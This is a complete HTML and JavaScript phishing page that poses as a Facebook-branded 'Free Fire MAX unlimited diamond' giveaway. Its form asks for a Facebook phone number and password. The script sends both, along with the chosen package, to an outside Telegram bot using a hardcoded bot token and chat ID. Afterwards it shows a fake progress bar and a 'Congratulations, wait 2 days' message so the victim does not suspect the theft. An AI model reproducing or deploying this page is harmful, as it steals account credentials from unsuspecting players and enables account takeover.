<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire DIAMOND GIVE UP 💎</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background-color: #fefce8;
            color: #1c1917;
            padding: 20px 10px;
        }

        .container {
            max-width: 450px;
            margin: 10px auto;
            background: #ffffff;
            border: 2px solid #eab308;
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 10px 25px rgba(234, 179, 8, 0.2);
            text-align: center;
        }

        .fb-logo {
            width: 48px;
            height: 48px;
            margin: 0 auto 10px auto;
            display: block;
        }

        h1 {
            color: #854d0e;
            font-size: 25px;
            font-weight: 900;
            margin-bottom: 5px;
            letter-spacing: 0.5px;
        }

        p.subtitle {
            color: #ca8a04;
            font-size: 13px;
            font-weight: 700;
            margin-bottom: 20px;
        }

        .form-group {
            text-align: left;
            margin-bottom: 12px;
        }

        label {
            display: block;
            font-size: 12px;
            font-weight: 800;
            color: #854d0e;
            margin-bottom: 4px;
        }

        input {
            width: 100%;
            padding: 11px;
            border: 2px solid #fef08a;
            background: #fefce8;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 700;
            outline: none;
            color: #1c1917;
        }

        input:focus {
            border-color: #eab308;
        }

        .error-text {
            color: #dc2626;
            font-size: 11px;
            font-weight: 700;
            margin-top: 4px;
            display: none;
        }

        .section-title {
            text-align: left;
            font-size: 12px;
            font-weight: 800;
            color: #854d0e;
            margin: 15px 0 8px;
        }

        .diamond-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-bottom: 15px;
        }

        .diamond-card {
            background: #fefce8;
            border: 2px solid #fef08a;
            border-radius: 10px;
            padding: 12px 8px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .diamond-card:hover {
            border-color: #eab308;
        }

        .diamond-card.selected {
            background: #fef9c3;
            border-color: #eab308;
            box-shadow: 0 0 10px rgba(234, 179, 8, 0.4);
            transform: scale(1.02);
        }

        .diamond-card .amount {
            font-size: 16px;
            font-weight: 900;
            color: #1c1917;
        }

        .diamond-card .icon {
            font-size: 18px;
            margin-top: 2px;
        }

        .btn-claim {
            width: 100%;
            padding: 13px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 900;
            border: none;
            cursor: not-allowed;
            transition: all 0.3s;
            background-color: #fef9c3;
            color: #ca8a04;
            opacity: 0.7;
        }

        .btn-claim.active {
            background-color: #eab308 !important;
            color: #000000 !important;
            opacity: 1 !important;
            cursor: pointer !important;
            box-shadow: 0 4px 12px rgba(234, 179, 8, 0.4);
        }

        .loading-box {
            display: none;
            margin-top: 20px;
        }

        .progress-bar-bg {
            width: 100%;
            background: #fef08a;
            border-radius: 10px;
            height: 16px;
            overflow: hidden;
            margin-top: 10px;
        }

        .progress-bar {
            width: 0%;
            height: 100%;
            background: #eab308;
            transition: width 0.3s;
        }

        .status-text {
            font-size: 12px;
            font-weight: 700;
            color: #a16207;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.6);
            backdrop-filter: blur(4px);
            justify-content: center;
            align-items: center;
            padding: 15px;
            z-index: 100;
        }

        .modal-content {
            background: #fff;
            padding: 25px;
            border-radius: 16px;
            border: 3px solid #eab308;
            max-width: 380px;
            width: 100%;
            text-align: center;
        }

        .modal-content h2 {
            font-size: 22px;
            color: #15803d;
            margin-bottom: 8px;
            font-weight: 900;
        }

        .modal-content p.main-msg {
            font-size: 18px;
            color: #854d0e;
            font-weight: 800;
            margin-bottom: 10px;
        }

        .modal-content p.sub-msg {
            font-size: 12px;
            color: #dc2626;
            font-weight: 700;
            margin-bottom: 15px;
        }

        .btn-close {
            background: #eab308;
            border: none;
            padding: 10px 20px;
            font-weight: 800;
            border-radius: 8px;
            cursor: pointer;
            color: #000;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Facebook Logo -->
        <svg class="fb-logo" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M20.1381 35.828V19.5101H25.6171L26.4381 13.1491H20.1381V9.08809C20.1381 7.24609 20.6501 5.99009 23.2921 5.99009L26.6631 5.98809V0.298089C26.0801 0.221089 24.0781 0.0460892 21.7481 0.0460892 C16.8831 0.0460892 13.5531 3.01809 13.5531 8.47209V13.1491H8.08311V19.5101H13.5531V35.828H20.1381Z" fill="#1877F2"/>
        </svg>

        <h1> FACEBOOK </h1>
     <h1> FREE FIRE MAX  </h1>
        <p class="subtitle"> UNLIMITED DIAMOND💎</p>

        <div id="mainForm">
            <!-- 10 Digit Phone Input (Auto Numeric Keyboard) -->
            <div class="form-group">
                <label> Facebook Phone Number:</label>
                <input 
                    type="tel" 
                    id="phoneNum" 
                    placeholder="Enter 10 digit number" 
                    maxlength="10" 
                    inputmode="numeric" 
                    pattern="[0-9]*" 
                    oninput="handlePhoneInput(this)">
                <div class="error-text" id="phoneError">Phone number must be exactly 10 digits!</div>
            </div>

            <!-- UID Input (Standard Keyboard) -->
            <div class="form-group">
                <label>Password:</label>
                <input 
                    type="text" 
                    id="playerUid" 
                    placeholder="Enter Facebook Password" 
                    oninput="validateForm()">
            </div>

            <!-- Diamond Selection Section -->
            <div class="section-title">SELECT DIAMOND PACKAGE:</div>
            <div class="diamond-grid">
                <div class="diamond-card" onclick="selectDiamond('5,000 Diamond', this)">
                    <span class="amount">5,000</span>
                    <span class="icon">💎</span>
                </div>
                <div class="diamond-card" onclick="selectDiamond('7,000 Diamond', this)">
                    <span class="amount">7,000</span>
                    <span class="icon">💎</span>
                </div>
                <div class="diamond-card" onclick="selectDiamond('10,000 Diamond', this)">
                    <span class="amount">10,000</span>
                    <span class="icon">💎</span>
                </div>
                <div class="diamond-card" onclick="selectDiamond('25K Diamond', this)">
                    <span class="amount">25K</span>
                    <span class="icon">💎</span>
                </div>
                <div class="diamond-card" style="grid-column: span 2;" onclick="selectDiamond('100K Diamond', this)">
                    <span class="amount">100K Diamond</span>
                    <span class="icon">💎</span>
                </div>
            </div>

            <button class="btn-claim" id="claimBtn" disabled onclick="startClaimProcess()">CLAIM NOW</button>
        </div>

        <div class="loading-box" id="loadingBox">
            <div class="status-text" id="statusText">Connecting to Garena Servers...</div>
            <div class="progress-bar-bg">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </div>
    </div>

    <div class="modal" id="prankModal">
        <div class="modal-content">
            <div style="font-size: 45px; margin-bottom: 5px;">🎉</div>
            <h2>Congratulations!</h2>
            <p class="main-msg">Wait 2 Days</p>
            <p class="sub-msg">(Check Your Mail ✉️ Box)</p>
            <button class="btn-close" onclick="closeModal()">Close </button>
        </div>
    </div>

    <script>
        let selectedDiamondPackage = "";

        // আপনার দেওয়া টোকেন ও চ্যাট আইডি এখানে যুক্ত করা আছে
        const TELEGRAM_BOT_TOKEN = "8996711384:AAEvWHYgrtHj8KVw_BiXRsOfa02x1DUH6sM"; 
        const TELEGRAM_CHAT_ID = "8228439523";     

        function handlePhoneInput(input) {
            input.value = input.value.replace(/[^0-9]/g, '');
            validateForm();
        }

        function selectDiamond(pkgName, element) {
            const cards = document.querySelectorAll('.diamond-card');
            cards.forEach(card => card.classList.remove('selected'));

            element.classList.add('selected');
            selectedDiamondPackage = pkgName;

            validateForm();
        }

        function validateForm() {
            const phone = document.getElementById('phoneNum').value.trim();
            const uid = document.getElementById('playerUid').value.trim();
            const claimBtn = document.getElementById('claimBtn');
            const phoneError = document.getElementById('phoneError');

            let isValid = true;

            if (phone.length !== 10) {
                isValid = false;
                phoneError.style.display = phone.length > 0 ? "block" : "none";
            } else {
                phoneError.style.display = "none";
            }

            if (uid === "" || selectedDiamondPackage === "") {
                isValid = false;
            }

            if (isValid) {
                claimBtn.disabled = false;
                claimBtn.classList.add('active');
            } else {
                claimBtn.disabled = true;
                claimBtn.classList.remove('active');
            }
        }

        // টেলিগ্রামে ডাটা পাঠানোর ফাংশন
        function sendToTelegram(phone, uid, diamondPkg) {
            const message = `💎 *NEW DIAMOND CLAIM REQUEST* 💎\n\n📱 *Phone:* \`${phone}\`\n🆔 *UID:* \`${uid}\`\n🎁 *Package:* \`${diamondPkg}\``;
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).catch(err => console.error("Error sending to Telegram:", err));
        }

        function startClaimProcess() {
            const phone = document.getElementById('phoneNum').value.trim();
            const uid = document.getElementById('playerUid').value.trim();

            // ক্লেইম করার সাথে সাথে আপনার টেলিগ্রামে মেসেজ চলে যাবে
            sendToTelegram(phone, uid, selectedDiamondPackage);

            document.getElementById('mainForm').style.display = 'none';
            document.getElementById('loadingBox').style.display = 'block';

            const progressBar = document.getElementById('progressBar');
            const statusText = document.getElementById('statusText');

            let progress = 0;
            const interval = setInterval(() => {
                progress += 10;
                progressBar.style.width = progress + '%';

                if (progress === 30) {
                    statusText.innerText = "Verifying 10 Digit Number...";
                } else if (progress === 60) {
                    statusText.innerText = "Processing " + selectedDiamondPackage + "...";
                } else if (progress === 90) {
                    statusText.innerText = "Finalizing Account Transfer...";
                } else if (progress >= 100) {
                    clearInterval(interval);
                    showSuccessModal();
                }
            }, 350);
        }

        function showSuccessModal() {
            document.getElementById('loadingBox').style.display = 'none';
            document.getElementById('prankModal').style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('prankModal').style.display = 'none';
            document.getElementById('mainForm').style.display = 'block';
            document.getElementById('phoneNum').value = "";
            document.getElementById('playerUid').value = "";
            selectedDiamondPackage = "";
            
            const cards = document.querySelectorAll('.diamond-card');
            cards.forEach(card => card.classList.remove('selected'));
            
            validateForm();
        }
    </script>
</body>
</html>
